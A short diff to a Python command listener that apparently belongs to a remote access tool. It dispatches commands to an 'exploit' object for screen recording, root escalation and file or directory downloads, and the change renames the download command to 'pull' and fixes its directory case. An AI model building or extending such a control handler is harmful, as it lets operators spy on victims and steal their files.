@@ -27,7 +27,7 @@ def listener():
                 exploit.screenrec()
             elif "root" in dog:
                 exploit.root()
-            elif "downloads" in dog:
+            elif "pull" in dog:
                 load = dog.split()
                 if len(load) == 5:
                     if load[1] == "-f" or load[1] == "--file" and load[3] == "-o" or load[3] == "--output":
@@ -37,7 +37,7 @@ def listener():
                     elif load[1] == "-d" or load[1] == "--dir" and load[3] == "-o" or load[3] == "--output":
                         path = load[2]
                         out = load[4]
-                        exploit.download("file",path,out)
+                        exploit.download("dir",path,out)
                     else:
                         exploit.help(3)
                 else:
